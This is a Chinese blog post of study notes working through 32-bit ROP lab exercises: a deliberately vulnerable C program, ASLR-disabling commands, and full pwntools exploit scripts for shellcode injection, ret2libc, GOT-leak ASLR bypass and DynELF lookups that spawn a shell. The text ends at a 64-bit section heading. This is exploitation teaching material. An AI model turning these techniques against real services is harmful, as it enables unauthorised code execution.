
<!DOCTYPE html>
<html lang="zh-CN">


<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#202020">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
  
  
    <meta name="keywords" content="二进制,栈溢出,Pwn,">
  

  
    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
  
  
  
  <link rel="icon" type="image/x-icon" href="/1.jpg">
  
  <title>蒸米32位及64位ROP笔记 [ Mi1k7ea ]</title>
  
    <!-- stylesheets list from config.yml -->
    
      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
    
      <link rel="stylesheet" href="/css/xoxo.css">
    
  
</head>


<body>
  <div class="nav-container">
    <nav class="home-menu pure-menu pure-menu-horizontal">
  <a class="pure-menu-heading" href="/">
    
    <span class="title" style="text-transform:none">Mi1k7ea</span>
  </a>

  <ul class="pure-menu-list clearfix">
      
          
            
              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
            
          
      
          
            
              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
            
          
      
  </ul>
   
</nav>

  </div>

  <div class="container" id="content-outer">
    <div class="inner" id="content-inner">
      <div class="post-container">
  <article class="post" id="post">
    <header class="post-header text-center">
      <h1 class="title">
        蒸米32位及64位ROP笔记
      </h1>
      <span>
        
        <time class="time" datetime="2019-04-09T13:39:23.000Z">
        2019-04-09
      </time>
        
      </span>
      <span class="slash">/</span>
      <span class="post-meta">
      <span class="post-tags">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/">Pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/二进制/">二进制</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/栈溢出/">栈溢出</a></li></ul>
      </span>
    </span>
      <!--<span class="slash">/</span>
      <span class="read">
      <span id="busuanzi_value_page_pv"></span> 点击
    </span>
      <span class="slash">/</span>-->
    </header>

    <div class="post-content">
      <p>这里将《一步一步学 ROP 之 Linux_x86 篇》和《一步一步学 ROP 之 Linux_64 篇》中的例子做一遍并记录下来。</p>
<h2 id="0x01-32位ROP"><a href="#0x01-32位ROP" class="headerlink" title="0x01 32位ROP"></a>0x01 32位ROP</h2><h3 id="level1——栈上执行shellcode"><a href="#level1——栈上执行shellcode" class="headerlink" title="level1——栈上执行shellcode"></a>level1——栈上执行shellcode</h3><p>level1主要演示32位程序中最基本的栈溢出利用，可直接在栈上写shellcode并执行。</p>
<p>level1.c：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">	read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">	vulnerable_function();</span><br><span class="line">	write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用如下指令编译：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -z execstack -o level1 level1.c</span><br></pre></td></tr></table></figure>
<p>-m32参数指定编译为32位程序；-fno-stack-protector参数指定不开启堆栈溢出保护，即不生成 canary；-z execstack参数指定允许栈执行，即不开启NX。</p>
<p>下面3条指令用来关闭整个linux系统的ASLR保护：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<p>运行程序，输入一串字符串然后返回helloworld；file查看是个动态链接的32位文件；checksec查看所有安全编译选项都没有开：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/1.png" alt=""></p>
<p>利用pattern计算偏移，可得到溢出偏移量为140：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/2.png" alt=""></p>
<p>由此，我们可以构造”A”*140+shellcode_addr即可将shellcode地址覆盖到函数返回地址中，从而让EIP指针寄存器指向shellcode地址让程序执行shellcode。</p>
<p>这里NX没开，我们可以直接往栈上写shellcode，具体为shellcode+”A”*(140-len(shellcode))+shellcode_addr。</p>
<p>shellcode的构造直接用pwntools的asm(shellcraft.sh())来获得。</p>
<p>下面获取写入的shellcode地址。由于ASLR等都关掉，因此现在获取的地址就不会变了。</p>
<p><strong>一个GDB的坑</strong></p>
<p>在GDB中调试level1，r运行，再输入”abcdaaaaa……”让程序崩溃，然后输入x/10s \$esp-144（144是由前面得到的140偏移再加上4字节的ret得到的）：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/3.png" alt=""></p>
<p>得到shellcode输入位置的偏移为0xffffcf70。</p>
<p>写payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./level1"</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">shellcode_addr = <span class="number">0xffffcf70</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">140</span>, <span class="string">"A"</span>) + p32(shellcode_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>然而在运行时会报错，无法正常利用。</p>
<p><strong>填坑</strong></p>
<blockquote>
<p>对初学者来说这个shellcode地址的位置其实是一个坑。因为正常的思维是使用gdb调试目标程序，然后查看内存来确定shellcode的位置。但当你真的执行exp的时候你会发现shellcode压根就不在这个地址上！这是为什么呢？原因是gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./level1的时候，buf的位置会固定在别的地址上。怎么解决这个问题呢？</p>
</blockquote>
<p>最简单的方法就是开启core dump这个功能。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ulimit -c unlimited</span><br><span class="line">sudo sh -c &apos;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&apos;</span><br></pre></td></tr></table></figure>
<p>开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/4.png" alt=""></p>
<p>由此得到shellcode真正的地址0xffffcfb0。</p>
<p>改下payload的地址即可getshell：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./level1"</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">shellcode_addr = <span class="number">0xffffcfb0</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">140</span>, <span class="string">"A"</span>) + p32(shellcode_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/09/蒸米ROP学习笔记/5.png" alt=""></p>
<p>除了本地调试，还有远程部署的方式，如下，将题目绑定到指定端口上：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp<span class="_">-l</span>:10001,fork <span class="built_in">exec</span>:./level1</span><br></pre></td></tr></table></figure>
<p>payload除了将p = process(“./level1”)改为p = remote(“127.0.0.1”, 10001)外，ret的地址还会发生改变。解决方法还是采用生成core dump的方案，然后用gdb调试core文件获取返回地址：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/6.png" alt=""></p>
<p>得到ret地址为0xffffcf00，改下payload即可远程getshell：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/7.png" alt=""></p>
<h3 id="level2——ret2libc绕过NX"><a href="#level2——ret2libc绕过NX" class="headerlink" title="level2——ret2libc绕过NX"></a>level2——ret2libc绕过NX</h3><p>一样的代码，只不过在用GCC编译开启NX保护即栈不可执行。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -o level2 level1.c</span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/09/蒸米ROP学习笔记/8.png" alt=""></p>
<blockquote>
<p>这时候我们如果使用level1的exp来进行测试的话，系统会拒绝执行我们的shellcode。如果你通过<code>sudo cat /proc/[pid]/maps</code>查看，你会发现level1的stack是rwx的，但是level2的stack却是rw的。</p>
</blockquote>
<p><img src="/2019/04/09/蒸米ROP学习笔记/9.png" alt=""></p>
<p>既然开启了NX，那一般是利用ROP绕过，这里用的是ret2libc，因为程序level2调用了libc.so，并且libc.so里保存了大量可利用的函数如system()和/bin/sh，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。</p>
<p>下面的问题就变为怎么获取libc中的system和binsh的地址。</p>
<p>因为我们关掉了ASLR，此时system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。</p>
<p>此时我们可以使用GDB进行调试，在main打下断点然后运行，程序在main断点处停下再通过print和find命令来查找system和”/bin/sh”字符串的地址：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/10.png" alt=""></p>
<p>system()函数地址为：0xf7e42940</p>
<p>/bin/sh地址为：0xf7f6102b</p>
<p>至于溢出偏移量和level1一样为140。</p>
<p>编写payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./level2"</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0xf7e42940</span></span><br><span class="line">binsh_addr = <span class="number">0xf7f6102b</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">140</span> + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/09/蒸米ROP学习笔记/11.png" alt=""></p>
<h3 id="level2——ROP绕过NX和ASLR"><a href="#level2——ROP绕过NX和ASLR" class="headerlink" title="level2——ROP绕过NX和ASLR"></a>level2——ROP绕过NX和ASLR</h3><p>在前一小节的基础下，开启在level1中关掉的ASLR：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br><span class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<p>如果你通过sudo cat /proc/[pid]/maps或者ldd查看，你会发现level2的libc.so地址每次都是变化的：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/12.png" alt=""></p>
<p>此时利用前一小节的办法print和find是获取不到对的地址的，因为每次运行栈的地址都会变化。</p>
<p>如何利用呢？——思路是：先泄漏出libc.so某些函数在内存中的地址，再利用泄漏出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，最后执行我们的ret2libc的shellcode。既然栈、libc、堆的地址都是随机的，我们怎么才能泄露出libc.so的地址呢？方法还是有的，因为程序本身在内存中的地址并不是随机的，如图所示，Linux内存随机化分布图：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/13.png" alt=""></p>
<p>所以我们只要把返回值设置到程序本身就可执行我们期望的指令了。</p>
<p>首先我们利用objdump来查看可以利用的plt函数和函数对应的got表：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/14.png" alt=""></p>
<blockquote>
<p>除了程序本身的函数之外，还有read@plt()和write@plt()函数可用，但因为程序本身没有调用system()函数因此并不能直接调用system()来获取shell。但其实我们有write@plt()函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。</p>
<p>既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got跳转到真正的write()函数上去。（如果还是搞不清楚的话，推荐阅读《程序员的自我修养 - 链接、装载与库》这本书）</p>
<p>因为system()函数和write()在libc.so中的offset(相对地址)是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以计算出system()在内存中的地址了。</p>
<p>然后我们再将pc指针return回vulnerable_function()函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。</p>
<p>使用ldd命令可以查看目标程序调用的so库。随后我们把libc.so拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址：</p>
</blockquote>
<p><img src="/2019/04/09/蒸米ROP学习笔记/15.png" alt=""></p>
<p>当然，除了用ldd命令查看libc.so库，还可以直接用pwntools库的elf.libc来获取libc.so库：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">"./level2"</span>)</span><br><span class="line">libc = elf.libc</span><br></pre></td></tr></table></figure>
<p>编写payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./level2")</span></span><br><span class="line">p = remote(<span class="string">"127.0.0.1"</span>, <span class="number">10001</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level2"</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">vulnerable_function_addr = elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() plt: "</span> + hex(write_plt)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() got: "</span> + hex(write_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]vulnerable_function() addr: "</span> + hex(vulnerable_function_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">140</span> + p32(write_plt) + p32(vulnerable_function_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload1 to leak write libc addr..."</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]leak write libc addr: "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc.address = write_addr - libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binsh_addr = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]system() addr: "</span> + hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]binsh addr: "</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"A"</span> * <span class="number">140</span> + p32(system_addr) + p32(<span class="number">0xdeedbeef</span>) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload2 to getshell..."</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/09/蒸米ROP学习笔记/16.png" alt=""></p>
<p>另一种是ldd命令查找再赋值libc.so文件到当前目录再加载的payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./level2")</span></span><br><span class="line">p = remote(<span class="string">"127.0.0.1"</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./level2"</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"libc.so.6"</span>)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">vulnerable_function_addr = elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() plt: "</span> + hex(write_plt)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() got: "</span> + hex(write_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]vulnerable_function() addr: "</span> + hex(vulnerable_function_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">140</span> + p32(write_plt) + p32(vulnerable_function_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload1 to leak write libc addr..."</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]leak write libc addr: "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc.address = write_addr - libc.symbols["write"]</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">"system"</span>] + write_addr - libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">binsh_addr = next(libc.search(<span class="string">"/bin/sh"</span>)) + write_addr - libc.symbols[<span class="string">"write"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]system() addr: "</span> + hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]binsh addr: "</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"A"</span> * <span class="number">140</span> + p32(system_addr) + p32(<span class="number">0xdeedbeef</span>) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload2 to getshell..."</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level2——Memory-Leak-amp-DynELF"><a href="#level2——Memory-Leak-amp-DynELF" class="headerlink" title="level2——Memory Leak &amp; DynELF"></a>level2——Memory Leak &amp; DynELF</h3><p>本小节介绍了在不获取目标libc.so的情况下进行ROP攻击。</p>
<p>前面一小节我们用到了目标机器的libc.so才能计算出libc中system()和/bin/sh等的地址来实现攻击，但是如果我们在获取不到目标机器上的libc.so情况下，应该如何做呢？这时候就需要通过memory leak(内存泄露)来搜索内存找到system()的地址。</p>
<blockquote>
<p>这里我们采用pwntools提供的DynELF模块来进行内存搜索。首先我们需要实现一个leak(address)函数，通过这个函数可以获取到某个地址上最少1 byte的数据。拿我们上一篇中的level2程序举例。leak函数应该是这样实现的：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    payload1 = <span class="string">'a'</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) +p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload1)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">	<span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
<blockquote>
<p>随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF(‘./level2’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。</p>
<p>要注意的是，通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。通过readelf -S level2这个命令就可以获取到bss段的地址了。</p>
</blockquote>
<p><img src="/2019/04/09/蒸米ROP学习笔记/17.png" alt=""></p>
<p>当然，可以在pwntools中直接调用elf.bss()获取.bss段地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">"./level2"</span>)</span><br><span class="line">bss_base = elf.bss()</span><br></pre></td></tr></table></figure>
<p>因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这里我们用ROPgadget来寻找：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/18.png" alt=""></p>
<p>编写payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"127.0.0.1"</span>, <span class="number">10001</span>)</span><br><span class="line"><span class="comment">#p = process("./level2")</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./level2"</span>)</span><br><span class="line">bss_base = elf.bss()</span><br><span class="line">plt_write = elf.plt[<span class="string">"write"</span>]</span><br><span class="line">plt_read = elf.plt[<span class="string">"read"</span>]</span><br><span class="line">vulfun_addr = elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() plt: "</span> + hex(plt_write)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]read() plt: "</span> + hex(plt_read)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]vulnerable_function() addr: "</span> + hex(vulfun_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*].bss addr: "</span> + hex(bss_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">        payload1 = <span class="string">'a'</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) +p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">        p.send(payload1)</span><br><span class="line">        data = p.recv(<span class="number">4</span>)</span><br><span class="line">        <span class="comment">#print "%#x =&gt; %s" % (address, (data or '').encode('hex'))</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">'./level2'</span>))</span><br><span class="line"></span><br><span class="line">execve_addr = d.lookup(<span class="string">'execve'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]execve() addr: "</span> + hex(execve_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#system_addr = d.lookup('system', 'libc')</span></span><br><span class="line"><span class="comment">#print "[*]system() addr: " + hex(system_addr)</span></span><br><span class="line"></span><br><span class="line">pop_pop_pop_ret = <span class="number">0x080484f9</span></span><br><span class="line">payload2 = <span class="string">"A"</span> * <span class="number">140</span> + p32(plt_read) + p32(pop_pop_pop_ret) + p32(<span class="number">0</span>) + p32(bss_base) + p32(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_base)</span></span><br><span class="line">payload2 += p32(execve_addr) + p32(vulfun_addr) + p32(bss_base) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\0"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>本地环境中system()函数执行有问题，老得不到shell，换了execve()函数即可：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/19.png" alt=""></p>
<h2 id="0x02-64位ROP"><a href="#0x02-64位ROP" class="headerlink" title="0x02 64位ROP"></a>0x02 64位ROP</h2><h3 id="level3——64位与32位区别"><a href="#level3——64位与32位区别" class="headerlink" title="level3——64位与32位区别"></a>level3——64位与32位区别</h3><blockquote>
